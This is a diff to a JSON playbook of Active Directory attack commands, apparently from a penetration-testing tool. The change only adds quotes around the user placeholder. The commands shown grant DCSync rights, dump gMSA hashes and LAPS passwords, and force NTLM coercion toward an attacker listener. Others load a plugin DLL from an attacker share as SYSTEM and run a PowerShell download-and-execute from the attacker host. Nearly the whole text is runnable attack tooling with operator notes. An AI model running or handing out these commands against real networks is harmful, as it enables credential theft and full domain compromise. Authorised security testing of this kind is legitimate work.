@@ -2804,19 +2804,19 @@
       "commands": [
         {
           "tool": "bloodyad",
-          "run": "bloodyAD -d {{domain}} --host {{target}} -u {{user}} -p '{{password}}' get writable --detail",
+          "run": "bloodyAD -d {{domain}} --host {{target}} -u '{{user}}' -p '{{password}}' get writable --detail",
           "settled_by": [
             "ad.acl_lead",
             "ad.control_paths",
             "ad.attack_paths"
           ],
-          "web": "bloodyAD -d {{domain}} --host {{target}} -u {{user}} -p '{{password}}' get writable --detail | tee {{scandir}}/bloodyad-writable.txt",
+          "web": "bloodyAD -d {{domain}} --host {{target}} -u '{{user}}' -p '{{password}}' get writable --detail | tee {{scandir}}/bloodyad-writable.txt",
           "web_note": "In a large domain --detail can run to tens of thousands of lines, too many to paste. It writes to scans/bloodyad-writable.txt (shown); attach that file in Evidence, obol only needs the writable-object lines.",
           "note": "Begin here: what can your account genuinely write to? The detailed output is your menu of options."
         },
         {
           "tool": "bloodyad",
-          "run": "bloodyAD -d {{domain}} --host {{target}} -u {{user}} -p '{{password}}' add groupMember \"{{group}}\" {{user}}",
+          "run": "bloodyAD -d {{domain}} --host {{target}} -u '{{user}}' -p '{{password}}' add groupMember \"{{group}}\" '{{user}}'",
           "settled_by": [
             "ad.group_joined"
           ],
@@ -2824,7 +2824,7 @@
         },
         {
           "tool": "bloodyad",
-          "run": "for g in {{abuse_groups_quoted}}; do bloodyAD -d {{domain}} --host {{target}} -u {{user}} -p '{{password}}' add groupMember \"$g\" {{user}} 2>/dev/null && echo \"[+] JOINED: $g\"; done",
+          "run": "for g in {{abuse_groups_quoted}}; do bloodyAD -d {{domain}} --host {{target}} -u '{{user}}' -p '{{password}}' add groupMember \"$g\" {{user}} 2>/dev/null && echo \"[+] JOINED: $g\"; done",
           "settled_by": [
             "ad.group_joined"
           ],
@@ -2833,7 +2833,7 @@
         {
           "tool": "bloodyad",
           "win": true,
-          "run": "bloodyAD -d {{domain}} --host {{target}} -u {{user}} -p '{{password}}' add dcsync {{user}}",
+          "run": "bloodyAD -d {{domain}} --host {{target}} -u '{{user}}' -p '{{password}}' add dcsync '{{user}}'",
           "settled_by": [
             "ad.control_paths",
             "ad.domain_control"
@@ -2851,12 +2851,12 @@
         },
         {
           "tool": "bloodyad",
-          "run": "bloodyAD -d {{domain}} --host {{target}} -u {{user}} -p '{{password}}' set owner \"{{target_sam}}\" {{user}}",
+          "run": "bloodyAD -d {{domain}} --host {{target}} -u '{{user}}' -p '{{password}}' set owner \"{{target_sam}}\" {{user}}",
           "note": "A WriteOwner edge (a DIFFERENT primitive, not the DCSync path). Take ownership of a specific object when your lead is WriteOwner over it, then grant yourself control over that object below. Owning a group is not the same as replication rights, for DCSync use the `add dcsync` card above."
         },
         {
           "tool": "bloodyad",
-          "run": "bloodyAD -d {{domain}} --host {{target}} -u {{user}} -p '{{password}}' add genericAll \"{{target_sam}}\" {{user}}",
+          "run": "bloodyAD -d {{domain}} --host {{target}} -u '{{user}}' -p '{{password}}' add genericAll \"{{target_sam}}\" {{user}}",
           "note": "Award yourself GenericAll over an object you own or can write the DACL of. From there you can reset its password, targeted-Kerberoast it, or add shadow credentials, the route when the target is a USER/computer rather than a WriteDACL-over-domain group."
         },
         {
@@ -2866,7 +2866,7 @@
         },
         {
           "tool": "bloodyad",
-          "run": "bloodyAD -d {{domain}} --host {{target}} -u {{user}} -p '{{password}}' remove uac '{{target_sam}}' -f ACCOUNTDISABLE",
+          "run": "bloodyAD -d {{domain}} --host {{target}} -u '{{user}}' -p '{{password}}' remove uac '{{target_sam}}' -f ACCOUNTDISABLE",
           "note": "Enable disabled account: removes the ACCOUNTDISABLE flag from userAccountControl via LDAP when holding GenericWrite or GenericAll over {{target_sam}}."
         },
         {
@@ -2978,7 +2978,7 @@
       "commands": [
         {
           "tool": "nxc",
-          "run": "nxc ldap {{target}} -u {{user}} -p '{{password}}' --gmsa",
+          "run": "nxc ldap {{target}} -u '{{user}}' -p '{{password}}' --gmsa",
           "note": "PREFERRED (Direct gMSA dump): NetExec queries LDAP over port 389, reads msDS-ManagedPassword blobs for all allowed gMSA accounts, and prints the cracked/computed NTLM hash directly."
         },
         {
@@ -2988,12 +2988,12 @@
         },
         {
           "tool": "bloodyAD",
-          "run": "bloodyAD --host {{target}} -d {{domain}} -u {{user}} -p '{{password}}' get object '{{gmsa_account}}$' --attr msDS-ManagedPassword",
+          "run": "bloodyAD --host {{target}} -d {{domain}} -u '{{user}}' -p '{{password}}' get object '{{gmsa_account}}$' --attr msDS-ManagedPassword",
           "note": "If you count as an allowed principal, this hands back the password blob; extract the NTLM with a gMSA parser (gMSADumper, DSInternals, or a brief python struct unpack)."
         },
         {
           "tool": "bloodyAD",
-          "run": "bloodyAD -d {{domain}} --host {{target}} -u {{user}} -p '{{password}}' get gmsa '{{gmsa_account}}'",
+          "run": "bloodyAD -d {{domain}} --host {{target}} -u '{{user}}' -p '{{password}}' get gmsa '{{gmsa_account}}'",
           "note": "bloodyAD gMSA retrieval: Extracts the gMSA account's NTLM hash straight via LDAP without touching LSASS or host."
         }
       ]
@@ -3034,12 +3034,12 @@
       "commands": [
         {
           "tool": "nxc",
-          "run": "nxc smb {{target}} -u {{user}} -p '{{password}}' --laps",
+          "run": "nxc smb {{target}} -u '{{user}}' -p '{{password}}' --laps",
           "note": "PREFERRED (Direct SMB LAPS Dump): NetExec queries the DC/target computer directly over SMB for the LAPS password (ms-Mcs-AdmPwd) and prints the local Administrator password."
         },
         {
           "tool": "nxc",
-          "run": "nxc ldap {{target}} -u {{user}} -p '{{password}}' -M laps",
+          "run": "nxc ldap {{target}} -u '{{user}}' -p '{{password}}' -M laps",
           "note": "The NetExec module dumps every readable LAPS password across all computers in one pass."
         },
         {
@@ -3096,7 +3096,7 @@
         {
           "tool": "sh",
           "run": "export KRB5CCNAME={{file}} && impacket-psexec -k -no-pass {{domain}}/{{user}}@{{target_sam}}.{{domain}}",
-          "note": "PREFERRED, from Kali: point KRB5CCNAME at a ccache ticket and any impacket tool with -k -no-pass reuses it, no session on the box. ticketConverter.py switches kirbi to ccache and back. nxc also accepts the ticket: nxc smb {{target}} -u {{user}} -k --use-kcache."
+          "note": "PREFERRED, from Kali: point KRB5CCNAME at a ccache ticket and any impacket tool with -k -no-pass reuses it, no session on the box. ticketConverter.py switches kirbi to ccache and back. nxc also accepts the ticket: nxc smb {{target}} -u '{{user}}' -k --use-kcache."
         },
         {
           "tool": "rubeus",
@@ -3518,27 +3518,27 @@
       "commands": [
         {
           "tool": "nxc",
-          "run": "nxc smb {{target}} -u {{user}} -p '{{password}}' -M coerce_plus -o LISTENER={{lhost}}",
+          "run": "nxc smb {{target}} -u '{{user}}' -p '{{password}}' -M coerce_plus -o LISTENER={{lhost}}",
           "note": "PREFERRED, from Kali: nxc's coerce_plus checks which coercion vectors (MS-EFSR/MS-RPRN/MS-DFSNM/MS-FSRVP) the target answers and fires them at your listener ({{lhost}}) in one module. Run -o LISTENER=... ALWAYS; add METHOD=PetitPotam to pin one. Start Responder or ntlmrelayx on {{lhost}} FIRST. Drop -u/-p for the unauth PetitPotam paths some DCs still allow."
         },
         {
           "tool": "nxc",
-          "run": "nxc smb {{target}} -u {{user}} -p '{{password}}' -M spooler -M webdav",
+          "run": "nxc smb {{target}} -u '{{user}}' -p '{{password}}' -M spooler -M webdav",
           "note": "Fast pre-check before firing coercion: confirms whether the Print Spooler (MS-RPRN) and WebClient (HTTP/WebDAV coercion) services are running on the target."
         },
         {
           "tool": "nxc",
-          "run": "nxc mssql {{target}} -u {{user}} -p '{{password}}' -M mssql_coerce -o LISTENER={{lhost}}",
+          "run": "nxc mssql {{target}} -u '{{user}}' -p '{{password}}' -M mssql_coerce -o LISTENER={{lhost}}",
           "note": "When MSSQL (1433) is exposed: coerce the SQL service account's machine auth to your listener via xp_dirtree/xp_fileexist. Same relay payoff, a different trigger when SMB coercion is patched."
         },
         {
           "tool": "coercer",
-          "run": "coercer coerce --always-continue -t {{target}} -l {{lhost}} -u {{user}} -p '{{password}}' -d {{domain}}",
+          "run": "coercer coerce --always-continue -t {{target}} -l {{lhost}} -u '{{user}}' -p '{{password}}' -d {{domain}}",
           "note": "The dedicated multi-method alternative when coerce_plus misses a vector: fire every known coercion method at the DC, aimed at your listener ({{lhost}}). --always-continue walks all methods without the per-method Continue/Skip/Stop prompt (so it runs unattended, not blocked on input). Start Responder or ntlmrelayx on {{lhost}} FIRST."
         },
         {
           "tool": "PetitPotam.py",
-          "run": "python3 PetitPotam.py -d {{domain}} -u {{user}} -p '{{password}}' {{lhost}} {{target}}",
+          "run": "python3 PetitPotam.py -d {{domain}} -u '{{user}}' -p '{{password}}' {{lhost}} {{target}}",
           "note": "The MS-EFSR EfsRpcOpenFileRaw coercion. Unpatched DCs accept it unauthenticated: python3 PetitPotam.py {{lhost}} {{target}}."
         },
         {
@@ -3742,7 +3742,7 @@
         },
         {
           "tool": "bloodyAD",
-          "run": "bloodyAD --host {{target}} -d {{domain}} -u {{user}} -p '{{password}}' get writable --detail",
+          "run": "bloodyAD --host {{target}} -d {{domain}} -u '{{user}}' -p '{{password}}' get writable --detail",
           "note": "List every object this account can write to, the groupPolicyContainer entries are the writable GPOs, and their cn is the {{gpo_id}} the pygpoabuse command needs. netexec has NO gpo_privesc module (it aborts); bloodyAD is the real, runnable enumerator. BloodHound's 'GPO' edges show the same on the Domain tab."
         }
       ]
@@ -3792,7 +3792,7 @@
         },
         {
           "tool": "netexec",
-          "run": "nxc smb {{target}} -u {{user}} -p '{{password}}' -x 'reg add HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\DNS\\\\Parameters /v ServerLevelPluginDll /d \\\\\\\\{{lhost}}\\\\share\\\\dns.dll' && nxc smb {{target}} -u {{user}} -p '{{password}}' -x 'sc.exe stop dns & sc.exe start dns'",
+          "run": "nxc smb {{target}} -u '{{user}}' -p '{{password}}' -x 'reg add HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\DNS\\\\Parameters /v ServerLevelPluginDll /d \\\\\\\\{{lhost}}\\\\share\\\\dns.dll' && nxc smb {{target}} -u '{{user}}' -p '{{password}}' -x 'sc.exe stop dns & sc.exe start dns'",
           "note": "Set ServerLevelPluginDll to your UNC path, then bounce the DNS service to load it as SYSTEM. Requires DnsAdmins (or write) on the DC."
         }
       ]
@@ -3945,7 +3945,7 @@
       "commands": [
         {
           "tool": "nxc",
-          "run": "nxc smb {{target}} -u {{user}} -p '{{password}}' -M nopac",
+          "run": "nxc smb {{target}} -u '{{user}}' -p '{{password}}' -M nopac",
           "note": "Fast ticket-size oracle check: confirms whether the DC issues TGTs vulnerable to CVE-2021-42278/42287 before running the full exploit."
         },
         {
@@ -4002,7 +4002,7 @@
       "commands": [
         {
           "tool": "nxc",
-          "run": "nxc smb {{target}} -u {{user}} -p '{{password}}' -M printnightmare",
+          "run": "nxc smb {{target}} -u '{{user}}' -p '{{password}}' -M printnightmare",
           "note": "Check whether the target's Print Spooler is vulnerable to CVE-2021-1675 / CVE-2021-34527 before staging a DLL."
         },
         {
@@ -4102,7 +4102,7 @@
       "commands": [
         {
           "tool": "sccmhunter",
-          "run": "sccmhunter.py find -u {{user}} -p {{password}} -d {{domain}} -dc-ip {{target}}",
+          "run": "sccmhunter.py find -u '{{user}}' -p {{password}} -d {{domain}} -dc-ip {{target}}",
           "note": "Map the SMS provider, management points, and site code over SMB/LDAP."
         },
         {
@@ -4163,12 +4163,12 @@
       "commands": [
         {
           "tool": "nxc",
-          "run": "nxc ldap {{target}} -u {{user}} -p {{password}} -M maq",
+          "run": "nxc ldap {{target}} -u '{{user}}' -p {{password}} -M maq",
           "note": "A non-zero MachineAccountQuota means any user, including you, can add the machine account Certifried needs."
         },
         {
           "tool": "certipy",
-          "run": "certipy account create -u {{user}}@{{domain}} -p '{{password}}' -dc-ip {{target}} -user evilpc -dns {{dc_fqdn}}",
+          "run": "certipy account create -u '{{user}}'@{{domain}} -p '{{password}}' -dc-ip {{target}} -user evilpc -dns {{dc_fqdn}}",
           "note": "Create a machine account whose dNSHostName matches a DC; that name is what the CA maps the certificate to."
         },
         {
@@ -4236,7 +4236,7 @@
         },
         {
           "tool": "coercer",
-          "run": "coercer coerce -u {{user}} -p '{{password}}' -t {{target}} -l {{spoofed_name}}",
+          "run": "coercer coerce -u '{{user}}' -p '{{password}}' -t {{target}} -l {{spoofed_name}}",
           "note": "Coerce the victim to authenticate with Kerberos to a name that resolves to your relay."
         },
         {
@@ -4311,7 +4311,7 @@
         },
         {
           "tool": "nxc",
-          "run": "nxc ldap {{target}} -u {{user}} -p '{{password}}' --query '(objectSid=*-{{rid}})' 'sAMAccountName'",
+          "run": "nxc ldap {{target}} -u '{{user}}' -p '{{password}}' --query '(objectSid=*-{{rid}})' 'sAMAccountName'",
           "note": "Resolve the cracked RID to a host; a machine credential authenticates as that host."
         }
       ],
@@ -4352,7 +4352,7 @@
       "commands": [
         {
           "tool": "bloodyAD",
-          "run": "bloodyAD -d {{domain}} --host {{target}} -u {{user}} -p '{{password}}' add dns '{{record_name}}' {{lhost}}",
+          "run": "bloodyAD -d {{domain}} --host {{target}} -u '{{user}}' -p '{{password}}' add dns '{{record_name}}' {{lhost}}",
           "note": "PREFERRED (Direct LDAP ADIDNS Injection): Creates an A record for {{record_name}} pointing to your attacker IP ({{lhost}}) in Active Directory Integrated DNS via LDAP."
         },
         {
@@ -4441,7 +4441,7 @@
         },
         {
           "tool": "smbmap",
-          "run": "smbmap -H {{target}} -d {{domain}} -u {{user}} -p '{{password}}' --download '{{share}}/{{remote_path}}'",
+          "run": "smbmap -H {{target}} -d {{domain}} -u '{{user}}' -p '{{password}}' --download '{{share}}/{{remote_path}}'",
           "note": "SMBMap one-line file download helper."
         }
       ]
@@ -4627,7 +4627,7 @@
       "commands": [
         {
           "tool": "nxc",
-          "run": "nxc winrm {{target}} -u {{user}} -p '{{password}}' -x \"powershell -c \\\"IEX(New-Object Net.WebClient).DownloadString('http://{{lhost}}/Get-MSOLCredentials.ps1')\\\"\"",
+          "run": "nxc winrm {{target}} -u '{{user}}' -p '{{password}}' -x \"powershell -c \\\"IEX(New-Object Net.WebClient).DownloadString('http://{{lhost}}/Get-MSOLCredentials.ps1')\\\"\"",
           "note": "REMOTE WINRM TRIGGER: Remotely triggers the ADSync decryption script over WinRM with low-privilege user in Azure Admins / ADSyncAdmins."
         },
         {
